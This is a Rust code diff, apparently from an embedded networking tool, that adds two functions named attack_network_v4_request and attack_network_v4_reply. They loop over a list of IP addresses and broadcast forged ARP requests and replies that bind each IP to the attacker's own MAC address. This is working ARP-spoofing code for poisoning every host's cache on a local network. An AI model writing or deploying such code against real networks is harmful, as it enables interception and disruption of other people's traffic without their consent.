@@ -220,6 +220,50 @@ pub fn attack_gateway_v4_request<'b, 'c, 'e, DeviceT>(
     }
 }
 
+pub fn attack_network_v4_request<'b, 'c, 'e, DeviceT>(
+    iface: &mut EthernetInterface<'b, 'c, 'e, DeviceT>,
+    eth_addr: EthernetAddress,
+    addrs: &ArpResponses,
+) where
+    DeviceT: for<'d> Device<'d>,
+{
+    for addr in addrs {
+        let arp_reqest = ArpRepr::EthernetIpv4 {
+            operation: ArpOperation::Request,
+            source_hardware_addr: eth_addr,
+            source_protocol_addr: addr.0,
+            target_hardware_addr: EthernetAddress([0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
+            target_protocol_addr: addr.0,
+        };
+
+        let mut buffer = vec![0; arp_reqest.buffer_len()];
+        let mut packet = ArpPacket::new_unchecked(&mut buffer);
+        arp_reqest.emit(&mut packet);
+
+        let tx_token = match iface.device.transmit() {
+            Some(x) => x,
+            None => return, // TODO "No tx descriptor available"
+        };
+
+        match dispatch_ethernet(
+            eth_addr,
+            tx_token,
+            Instant::from_millis(system_clock::ms() as i64),
+            arp_reqest.buffer_len(),
+            |mut frame| {
+                frame.set_dst_addr(EthernetAddress::BROADCAST);
+                frame.set_ethertype(EthernetProtocol::Arp);
+
+                let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
+                arp_reqest.emit(&mut packet);
+            },
+        ) {
+            Ok(x) => x,
+            Err(_) => (),
+        }
+    }
+}
+
 pub fn attack_gateway_v4_reply<'b, 'c, 'e, DeviceT>(
     iface: &mut EthernetInterface<'b, 'c, 'e, DeviceT>,
     eth_addr: EthernetAddress,
@@ -271,6 +315,50 @@ pub fn attack_gateway_v4_reply<'b, 'c, 'e, DeviceT>(
     ) {
         Ok(x) => x,
         Err(_) => (),
+    }
+}
+
+pub fn attack_network_v4_reply<'b, 'c, 'e, DeviceT>(
+    iface: &mut EthernetInterface<'b, 'c, 'e, DeviceT>,
+    eth_addr: EthernetAddress,
+    addrs: &ArpResponses,
+) where
+    DeviceT: for<'d> Device<'d>,
+{
+    for addr in addrs {
+        let arp_reply = ArpRepr::EthernetIpv4 {
+            operation: ArpOperation::Reply,
+            source_hardware_addr: eth_addr,
+            source_protocol_addr: addr.0,
+            target_hardware_addr: eth_addr,
+            target_protocol_addr: addr.0,
+        };
+
+        let mut buffer = vec![0; arp_reply.buffer_len()];
+        let mut packet = ArpPacket::new_unchecked(&mut buffer);
+        arp_reply.emit(&mut packet);
+
+        let tx_token = match iface.device.transmit() {
+            Some(x) => x,
+            None => return, // TODO "No tx descriptor available"
+        };
+
+        match dispatch_ethernet(
+            eth_addr,
+            tx_token,
+            Instant::from_millis(system_clock::ms() as i64),
+            arp_reply.buffer_len(),
+            |mut frame| {
+                frame.set_dst_addr(EthernetAddress::BROADCAST);
+                frame.set_ethertype(EthernetProtocol::Arp);
+
+                let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
+                arp_reply.emit(&mut packet);
+            },
+        ) {
+            Ok(x) => x,
+            Err(_) => (),
+        }
     }
 }
 
